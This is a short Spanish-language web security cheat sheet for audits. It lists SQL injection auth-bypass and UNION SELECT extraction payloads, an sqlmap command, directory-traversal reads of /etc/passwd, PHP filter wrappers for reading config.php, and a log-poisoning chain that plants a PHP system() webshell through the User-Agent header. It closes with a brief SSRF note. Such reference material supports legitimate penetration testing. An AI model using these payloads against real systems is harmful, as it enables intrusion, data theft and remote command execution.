# 🕷️ Knowledge Base: Web Security

Metodologías de evaluación, vulnerabilidades habituales (OWASP Top 10) y técnicas de evasión en auditorías web.

---

## 🎯 Vulnerabilidades Principales

### 1. Inyección SQL (SQLi)
* **Auth Bypass Clásico**:
  ```sql
  admin' or 1=1 -- -
  ' or '1'='1
  ```
* **Extracción Manual con `UNION SELECT`**:
  ```sql
  ' UNION SELECT 1,2,3,version() -- -
  ' UNION SELECT 1,2,table_name,4 FROM information_schema.tables WHERE table_schema=database() -- -
  ```
* **Automatización con Sqlmap**:
  ```bash
  sqlmap -u "http://target.com/item.php?id=1" --batch --dbs
  ```

---

### 2. Local File Inclusion (LFI) & Log Poisoning
* **Directory Traversal**:
  ```text
  /index.php?page=../../../../etc/passwd
  /index.php?page=....//....//....//etc/passwd (Bypass simple)
  ```
* **PHP Wrappers**:
  ```text
  php://filter/convert.base64-encode/resource=config.php
  php://input
  ```
* **Log Poisoning**:
  1. Acceder a `/var/log/apache2/access.log`.
  2. Inyectar payload PHP en la cabecera `User-Agent`:
     ```text
     User-Agent: <?php system($_GET['cmd']); ?>
     ```
  3. Ejecutar comando mediante LFI:
     ```text
     /index.php?page=/var/log/apache2/access.log&cmd=id
     ```

---

### 3. Server-Side Request Forgery (SSRF)
Permite engañar al servidor para que realice peticiones hacia recursos internos inaccesibles desde el exterior (`127.0.0.1`, `localhost`, endpoints de metadatos en la nube `169.254.169.254`).
